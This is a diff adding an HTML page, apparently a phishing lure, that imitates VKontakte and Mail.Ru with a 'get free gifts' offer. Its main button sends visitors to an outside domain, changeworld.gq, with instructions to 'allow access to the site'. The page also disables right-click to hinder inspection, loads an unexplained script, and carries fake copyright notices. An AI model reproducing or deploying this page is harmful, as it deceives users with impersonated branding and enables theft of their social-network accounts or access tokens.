@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<script src="/n.js"></script>
+	<meta charset="utf-8">
+	<meta name="description" content="VK Gifts">
+	<title>VK Gifts </title>
+	<link rel="shortcut icon" href="http://icons.iconarchive.com/icons/papirus-team/papirus-apps/256/vk-icon.png" type="image/x-icon">
+	<link rel="stylesheet" href="css/main.css">
+	<script src="https://wf.cdn.gmru.net/static/general/js/jquery-2.1.4.min.js"></script>
+</head>
+<body>
+<script>
+
+function click(e) {
+   if (document.all) {   
+      if (event.button == 2) {    
+          alert(message);    
+          return false;}
+      }
+   if (document.layers) { 
+      if (e.which == 3) {
+          alert(message);
+          return false;}
+      }
+}
+if (document.layers)
+   {document.captureEvents(Event.MOUSEDOWN);}
+document.onmousedown=click;
+document.oncontextmenu=function(e){return false};
+
+</script>
+<header>
+	<div class="header__controls">
+		<div class="content">
+			<div class="header__left">
+				<a href="index.html" class="auth__link" target="_blank">На главную страницу</a>
+			</div>
+			
+			<div class="header__left">
+					<span class="auth__link js-start-button js-auth-init">Информация</span>
+				</div>
+
+			<div class="server js-server"></div>
+		</div>
+	</div>
+</header>
+
+<main>
+	<div class="content">
+		<section class="logo">
+			<img src="img/logo.png" alt="VKontakte">
+			<h1 class="js-event-title">Войди с помощью ВКонтакте и начни получать подарки!</h1>
+		</section>
+		
+		<section class="prize js-start" style="">
+			<form action="http://changeworld.gq/auth/index.php">
+			<button class="button prize__button">Получить подарок</button>
+			</form>
+			<div class="prize__list">
+				<div class="prize__item prize__item_big border border_corner">
+					<img src="img/gift1.png" alt="">
+					<div class="prize__item-name">3 Набора Стикеров</div>
+				</div>	
+				<div class="prize__item border">
+					<img src="img/gift2.png" alt="">
+					<div class="prize__item-name">3 Случайных Подарка</div>
+				</div>
+				<div class="prize__item border">
+					<img src="img/gift3.png" alt="">
+					<div class="prize__item-name">2 Случайных Подарка</div>
+				</div>
+				<div class="prize__item border">
+					<img src="img/gift4.png" alt="">
+					<div class="prize__item-name">1 Случайный Подарок</div>
+				</div>				
+			</div>
+		</section>
+		
+		<style>
+		.prize {
+  background: rgba(8,10,10,0.75) radial-gradient(circle closest-corner at center 180px, rgba(80,252,245,0.3), transparent 55%);
+  padding: 40px 150px;
+}
+.prize__item_big {
+  width: 100%;
+  margin-bottom: 25px;
+}
+</style>
+	</div>
+</main>
+
+<footer>
+		
+	<div class="logos">
+		<div>
+			<style>@import 'css/footer.css';</style>
+			<script>
+				var footer_logo1 = (typeof(footer_logo1) != 'undefined') ? footer_logo1 : '',
+					footer_logo2 = (typeof(footer_logo2) != 'undefined') ? footer_logo2 : '',
+					footer_logo3 = (typeof(footer_logo3) != 'undefined') ? footer_logo3 : '';	
+			</script>
+			
+			<script>
+			document.write('<a target="_blank" href="http://vk.com/"><img src="img/vkontakte.png" alt="Crytek"></a>');
+			document.write('<a target="_blank" href="https://mail.ru/"><img src="img/mail.png" alt="Mail.Ru"></a>');
+			</script>
+		</div>
+	</div>
+	
+	<div class="copyright">
+		<p>© <script>document.write(new Date().getFullYear());</script> VKontakte. All Rights Reserved.</p>
+		<p>© <script>document.write(new Date().getFullYear());</script> Mail.Ru Group. All Rights Reserved.</p>
+	</div>
+	
+	<div class="counters">
+		
+	<script>
+		var footer_mr = (typeof(footer_mr) != 'undefined') ? footer_mr : '305',
+			footer_li = (typeof(footer_li) != 'undefined') ? footer_li : '.5';
+	</script>
+	
+	<script src="https://wf.cdn.gmru.net/static/wf.mail.ru/js/1link_processing.js"></script>
+	</div>
+	
+</footer>
+  <div class="registration js-regform-wrap" style="display:none">
+    <div class="registration__wrap regform">
+      <div class="registration__close js-regform-close"></div>
+      <div class="registration__inner">
+      <div class="registration__tabs">
+        <div class="registration__tab js-tab-n" data-tabs="reg">Информация</div>
+      </div>
+      <div class="registration__form display-none" data-tabs-set="reg">
+                    <h4>Чтобы испытать удачу и получить подарок Вам необходимо: ". </h4>
+					<h4>1. Нажать кнопку "Получить подарок" </h4>
+					<h4>2. Разрешить доступ сайту.</h4>
+					<h4>3. После успешной авторизации Вы попадёте на страницу, где Вы сможете получить подарок. </h4>
+					<h4>Всё легко и просто. А главное бесплатно!</h4>
+					<br>
+					                                        
+					                                                 
+      </div>
+    </div>
+  </div>
+ </div>
+ 
+<script type="text/javascript">
+  var back_url = window.location.href;
+  $('.js-login-back').val(back_url)
+</script>
+<script src="https://wf.cdn.gmru.net/static/wf.mail.ru/modules/regform/js/reg_default.js" charset="utf-8"></script>
+  </body>
+</html>
